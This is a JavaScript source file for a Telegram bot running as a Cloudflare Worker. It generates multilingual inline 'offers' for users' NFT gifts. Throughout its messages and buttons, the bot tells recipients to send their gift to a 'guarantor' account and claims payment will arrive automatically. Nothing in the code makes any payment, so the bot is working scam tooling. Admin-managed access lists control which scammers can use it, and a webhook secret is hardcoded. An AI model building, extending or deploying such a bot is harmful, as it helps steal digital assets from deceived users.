const ADMIN_ID_1 = 5151757168; 
const ADMIN_ID_2 = 7423713851; 
const WEBHOOK_SECRET = "GarisOffer9231998"; 
const RELAYER_USERNAME = "GarisOffer_Relayer";

export default {
  async fetch(request, env, ctx) {
    const BOT_TOKEN = env.BOT_TOKEN; 
    const kv = env.USERS_KV; 

    if (!BOT_TOKEN) return new Response("Bot token is not configured", { status: 500 });

    const secretHeader = request.headers.get("X-Telegram-Bot-Api-Secret-Token");
    if (secretHeader !== WEBHOOK_SECRET) return new Response("Forbidden", { status: 403 });

    if (request.method !== "POST") return new Response("OK", { status: 200 });

    try {
      const update = await request.json();

      // ==========================================
      // ПРОВЕРКА ДОСТУПА
      // ==========================================
      async function checkAccess(userId, username) {
          if (userId === ADMIN_ID_1 || userId === ADMIN_ID_2) return true; 
          if (!kv) return false; 
          const byId = await kv.get(`allowed_id:${userId}`);
          if (byId) return true;
          if (username) {
              const byName = await kv.get(`allowed_username:${username.toLowerCase()}`);
              if (byName) return true;
          }
          return false;
      }

      // --- /start ---
      if (update.message && update.message.text === "/start") {
        const chatId = update.message.chat.id;
        const userId = update.message.from.id;
        const username = update.message.from.username;

        if (kv) await kv.put(`user:${userId}`, username || "no_username");

        const startText = `ID: <code>${userId}</code>\n\n⚙️ <b>Как это работает:</b>\n\n1. Вам приходит оффер на ваш подарок.\n2. Вы нажимаете «Принять».\n3. Передаете подарок гаранту <b>@${RELAYER_USERNAME}</b>.\n4. Оплата приходит автоматически.`;
        
        const startMarkup = {
          inline_keyboard: [[{ text: "Инструкция", callback_data: "how_to_accept" }]]
        };

        await callApi("sendMessage", { chat_id: chatId, text: startText, parse_mode: "HTML", reply_markup: startMarkup }, BOT_TOKEN);
      }

      // --- INLINE-ЗАПРОСЫ ---
      if (update.inline_query) {
        try {
            const iq = update.inline_query;
            const userId = iq.from.id;
            const username = iq.from.username || "";

            if (kv) await kv.put(`user:${userId}`, username || "no_username");

            const hasAccess = await checkAccess(userId, username);
            if (!hasAccess) return new Response("OK", { status: 200 });

            let textQuery = iq.query.replace(/[\u00A0\u200B\u202F]/g, ' ').replace(/https?:\/\//gi, '').trim().toLowerCase(); 
            
            let lang = "ru";
            if (textQuery.includes("eng") || textQuery.includes("en ")) { lang = "en"; textQuery = textQuery.replace(/eng/g, '').trim(); } 
            else if (textQuery.includes("cn") || textQuery.includes("中文")) { lang = "cn"; textQuery = textQuery.replace(/cn/g, '').trim(); }

            const allNums = textQuery.match(/\d+/g); 
            const amount = allNums ? allNums[allNums.length - 1] : "0"; 
            
            const giftMatch = textQuery.match(/(?:https?:\/\/)?(?:t\.me\/nft\/)?[A-Za-z0-9_-]+/i); 
            let giftLink = "";
            let giftDisplay = "";
            if (giftMatch && giftMatch[0]) {
                let rawGift = giftMatch[0].replace(/^https?:\/\//, '');
                giftLink = rawGift.startsWith("t.me") ? "https://" + rawGift : "https://t.me/nft/" + rawGift;
                giftDisplay = rawGift;
            } else {
                giftLink = "https://t.me/telegram"; 
                giftDisplay = "Подарок";
            }

            let currencyType = "stars";
            let currencySymbol = "⭐";
            let currencyName = "Stars";

            if (textQuery.includes("gram") || textQuery.includes("ton")) { 
                currencyType = "gram"; 
                currencySymbol = "💎"; 
                currencyName = "Gram";
            } else if (textQuery.includes("rub") || textQuery.includes("руб")) { 
                currencyType = "rub"; 
                currencySymbol = "₽"; 
                currencyName = "Rub";
            }

            let senderName = iq.from.first_name || "";
            if (iq.from.last_name) senderName += " " + iq.from.last_name;
            if (!senderName) senderName = iq.from.username ? "@" + iq.from.username : "Игрок";
            const sellerUsername = iq.from.username ? iq.from.username.toLowerCase() : "gwrex";
            
            // ПОНЯТНЫЙ ТЕКСТ (ИСПРАВЛЕНА ОШИБКА С linkOrGift)
            let text = "";
            let btnAccept = "Принять";
            let btnDecline = "Отклонить";
            let titleText = "";

            if (lang === "en") {
                text = `📩 <b>Offer for your gift</b>\n\nYou are offered <b>${amount} ${currencyName}</b> ${currencySymbol}\n🎁 ${giftDisplay}\n\nTo receive payment, send the gift to the guarantor @${RELAYER_USERNAME}.`;
                btnAccept = "Accept";
                btnDecline = "Decline";
                titleText = `Offer: ${amount} ${currencyName}`;
            } else if (lang === "cn") {
                text = `📩 <b>针对您礼物的报价</b>\n\n有人为您提供 <b>${amount} ${currencyName}</b> ${currencySymbol}\n🎁 ${giftDisplay}\n\n要获得付款，请将礼物发送给担保人 @${RELAYER_USERNAME}。`;
                btnAccept = "接受";
                btnDecline = "拒绝";
                titleText = `报价: ${amount} ${currencyName}`;
            } else {
                text = `📩 <b>Оффер на ваш подарок</b>\n\nВам предлагают <b>${amount} ${currencyName}</b> ${currencySymbol}\n🎁 ${giftDisplay}\n\nЧтобы получить оплату, передайте подарок гаранту @${RELAYER_USERNAME}.`;
                btnAccept = "Принять";
                btnDecline = "Отклонить";
                titleText = `Оффер: ${amount} ${currencyName}`;
            }

            const results = [{
              type: "article", id: "1",
              title: titleText,
              description: `${amount} ${currencyName} за ${giftDisplay}`,
              input_message_content: { message_text: text, parse_mode: "HTML" },
              reply_markup: { inline_keyboard: [
                  [{ text: btnAccept, callback_data: `acc|${amount}|${currencyType}|${sellerUsername}|${giftLink}|${lang}` }],
                  [{ text: btnDecline, callback_data: `dec|${amount}|${currencyType}|${lang}` }]
              ] }
            }];

            await callApi("answerInlineQuery", { inline_query_id: iq.id, results: results, cache_time: 0 }, BOT_TOKEN);
        } catch (e) { 
            console.error("Ошибка inline_query:", e.message); 
            // Отправляем пустой ответ, чтобы Telegram не висел
            await callApi("answerInlineQuery", { inline_query_id: update.inline_query.id, results: [], cache_time: 0 }, BOT_TOKEN);
        }
      }

      // --- КНОПКИ ---
      if (update.callback_query) {
        const cq = update.callback_query;
        const chatId = cq.message.chat.id;
        
        // МГНОВЕННЫЙ ОТВЕТ
        try {
            if (cq.data.startsWith("acc")) {
                await callApi("answerCallbackQuery", { callback_query_id: cq.id, text: "Оффер принят ✅", show_alert: true }, BOT_TOKEN);
            } else if (cq.data.startsWith("dec")) {
                await callApi("answerCallbackQuery", { callback_query_id: cq.id }, BOT_TOKEN);
            } else if (cq.data === "how_to_accept" || cq.data === "back_to_start") {
                await callApi("answerCallbackQuery", { callback_query_id: cq.id }, BOT_TOKEN);
            }
        } catch (e) { console.error("Ошибка ответа на кнопку:", e.message); }

        // ИНСТРУКЦИЯ
        if (cq.data === "how_to_accept") {
          try {
              const instructionText = `🎁 <b>Инструкция:</b>\n\n1. Нажмите «Принять».\n2. Нажмите «Передать подарок».\n3. Отправьте подарок гаранту <b>@${RELAYER_USERNAME}</b>.\n4. Оплата придет автоматически.`;
              const backMarkup = { inline_keyboard: [[{ text: "Назад", callback_data: "back_to_start" }]] };
              await callApi("editMessageText", { chat_id: chatId, message_id: cq.message.message_id, text: instructionText, parse_mode: "HTML", reply_markup: backMarkup }, BOT_TOKEN); 
          } catch (e) {}
        }

        if (cq.data === "back_to_start") {
          try {
              const userId = cq.from.id;
              const startText = `ID: <code>${userId}</code>\n\n⚙️ <b>Как это работает:</b>\n\n1. Вам приходит оффер на ваш подарок.\n2. Вы нажимаете «Принять».\n3. Передаете подарок гаранту <b>@${RELAYER_USERNAME}</b>.\n4. Оплата приходит автоматически.`;
              const startMarkup = { inline_keyboard: [[{ text: "Инструкция", callback_data: "how_to_accept" }]] };
              await callApi("editMessageText", { chat_id: chatId, message_id: cq.message.message_id, text: startText, parse_mode: "HTML", reply_markup: startMarkup }, BOT_TOKEN); 
          } catch (e) {}
        }

        // ОБРАБОТКА КНОПОК
        if (cq.data.startsWith("acc") || cq.data.startsWith("dec")) {
          try {
              const dataParts = cq.data.split("|");
              const action = dataParts[0];
              const amount = dataParts[1] || "0";
              const currencyType = dataParts[2] || "stars";
              const sellerUsername = dataParts[3] || "gwrex"; 
              const giftLink = dataParts[4] || ""; 
              
              let lang = "ru";
              if (action === "acc") { lang = dataParts[5] || "ru"; } else { lang = dataParts[3] || "ru"; }
              
              let displayCurrency = "⭐";
              if (currencyType === "gram") displayCurrency = "💎";
              if (currencyType === "rub") displayCurrency = "₽";

              const buyer = cq.from;
              let buyerName = buyer.first_name || "";
              if (buyer.last_name) buyerName += " " + buyer.last_name;

              let newText = "";
              let newMarkup = { inline_keyboard: [] };

              if (action === "acc") {
                const finalUrl = "https://t.me/" + RELAYER_USERNAME;

                if (lang === "en") {
                    newText = `✅ <b>Offer accepted!</b>\n\nBuyer: <b>${buyerName}</b>\n\nTransfer the gift to @${RELAYER_USERNAME}.`;
                    newMarkup = { inline_keyboard: [[{ text: "Send Gift", url: finalUrl }]] };
                } else if (lang === "cn") {
                    newText = `✅ <b>报价已接受！</b>\n\n买家：<b>${buyerName}</b>\n\n将礼物转移给 @${RELAYER_USERNAME}。`;
                    newMarkup = { inline_keyboard: [[{ text: "发送礼物", url: finalUrl }]] };
                } else {
                    newText = `✅ <b>Оффер принят!</b>\n\nПокупатель: <b>${buyerName}</b>\n\nПередайте подарок гаранту @${RELAYER_USERNAME}.`;
                    newMarkup = { inline_keyboard: [[{ text: "Передать подарок", url: finalUrl }]] };
                }
              } else {
                if (lang === "en") newText = `❌ <b>Offer declined.</b>`;
                else if (lang === "cn") newText = `❌ <b>报价已拒绝。</b>`;
                else newText = `❌ <b>Оффер отклонен.</b>`;
              }

              if (cq.inline_message_id) {
                try {
                  if (cq.message && cq.message.caption !== undefined) {
                    await callApi("editMessageCaption", { inline_message_id: cq.inline_message_id, caption: newText, parse_mode: "HTML", reply_markup: newMarkup }, BOT_TOKEN);
                  } else {
                    await callApi("editMessageText", { inline_message_id: cq.inline_message_id, text: newText, parse_mode: "HTML", reply_markup: newMarkup }, BOT_TOKEN);
                  }
                } catch (err) {}
              } else if (cq.message) {
                try {
                  await callApi("sendMessage", { chat_id: chatId, text: newText, parse_mode: "HTML", reply_markup: newMarkup }, BOT_TOKEN);
                  try { await callApi("deleteMessage", { chat_id: chatId, message_id: cq.message.message_id }, BOT_TOKEN); } catch (e) {}
                } catch (err) {}
              }
          } catch (e) { console.error("Ошибка обработки кнопки:", e.message); }
        }
      }

      // --- АДМИНКА ---
      if (update.message && update.message.text === "/stats") {
        try {
            const senderId = update.message.from.id;
            const chatId = update.message.chat.id;

            if (senderId !== ADMIN_ID_1 && senderId !== ADMIN_ID_2) { await callApi("sendMessage", { chat_id: chatId, text: "⛔ У вас нет прав." }, BOT_TOKEN); return new Response("OK", { status: 200 }); }
            if (!kv) { await callApi("sendMessage", { chat_id: chatId, text: "❌ База данных KV не подключена." }, BOT_TOKEN); return new Response("OK", { status: 200 }); }

            let cursor = undefined;
            let idsList = [];
            let usernamesList = [];

            do {
                const list = await kv.list({ cursor });
                for (const key of list.keys) {
                    if (key.name.startsWith("allowed_id:")) idsList.push(key.name.replace("allowed_id:", ""));
                    if (key.name.startsWith("allowed_username:")) usernamesList.push(key.name.replace("allowed_username:", ""));
                }
                cursor = list.cursor;
            } while (cursor);

            let statsText = `📊 <b>Доступ:</b>\n\nID: ${idsList.length}\n@: ${usernamesList.length}`;
            await callApi("sendMessage", { chat_id: chatId, text: statsText, parse_mode: "HTML" }, BOT_TOKEN);
        } catch (err) { console.error("Ошибка stats:", err.message); }
        return new Response("OK", { status: 200 });
      }

      if (update.message && (update.message.text.startsWith("/add ") || update.message.text.startsWith("/remove "))) {
        try {
            const senderId = update.message.from.id;
            if (senderId !== ADMIN_ID_1 && senderId !== ADMIN_ID_2) return new Response("OK", { status: 200 });
            if (!kv) return new Response("OK", { status: 200 });

            const args = update.message.text.split(" ");
            const command = args[0]; 
            const targetUser = args[1]; 

            if (!targetUser) { await callApi("sendMessage", { chat_id: update.message.chat.id, text: "⚠️ Укажите ID или @username.", parse_mode: "HTML" }, BOT_TOKEN); return new Response("OK", { status: 200 }); }

            if (command === "/add") {
                if (targetUser.startsWith("@")) {
                    await kv.put(`allowed_username:${targetUser.slice(1).toLowerCase()}`, "true");
                    await callApi("sendMessage", { chat_id: update.message.chat.id, text: `✅ @${targetUser.slice(1)} добавлен.` }, BOT_TOKEN);
                } else {
                    await kv.put(`allowed_id:${targetUser}`, "true");
                    await callApi("sendMessage", { chat_id: update.message.chat.id, text: `✅ ID ${targetUser} добавлен.` }, BOT_TOKEN);
                }
            } 
            else if (command === "/remove") {
                if (targetUser.startsWith("@")) {
                    await kv.delete(`allowed_username:${targetUser.slice(1).toLowerCase()}`);
                    await callApi("sendMessage", { chat_id: update.message.chat.id, text: `🗑 @${targetUser.slice(1)} удален.` }, BOT_TOKEN);
                } else {
                    await kv.delete(`allowed_id:${targetUser}`);
                    await callApi("sendMessage", { chat_id: update.message.chat.id, text: `🗑 ID ${targetUser} удален.` }, BOT_TOKEN);
                }
            }
        } catch (e) { console.error("Ошибка админки:", e.message); }
        return new Response("OK", { status: 200 });
      }

      return new Response("OK", { status: 200 });
    } catch (error) {
      console.error("КРИТИЧЕСКАЯ ОШИБКА:", error.message);
      return new Response("Error: " + error.message, { status: 500 });
    }
  }
};

async function callApi(method, body, token) {
  const url = `https://api.telegram.org/bot${token}/${method}`;
  try {
    const response = await fetch(url, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(body) });
    const data = await response.json();
    if (!data.ok) throw new Error(data.description);
    return data;
  } catch (e) { console.error(`Ошибка API [${method}]:`, e.message); throw e; }
}